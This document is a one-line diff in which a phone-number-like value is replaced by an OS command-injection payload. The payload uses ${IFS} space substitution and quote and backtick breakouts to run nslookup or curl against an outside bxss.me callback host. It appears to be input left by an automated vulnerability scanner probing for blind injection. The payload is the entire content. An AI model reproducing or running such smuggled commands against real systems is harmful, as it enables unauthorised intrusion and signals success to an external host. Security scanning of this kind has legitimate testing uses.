@@ -1,1 +1,1 @@
-5559999029
+&(nslookup${IFS}-q${IFS}cname${IFS}hitlscpykjyuobf695.bxss.me||curl${IFS}hitlscpykjyuobf695.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitlscpykjyuobf695.bxss.me||curl${IFS}hitlscpykjyuobf695.bxss.me)&`'
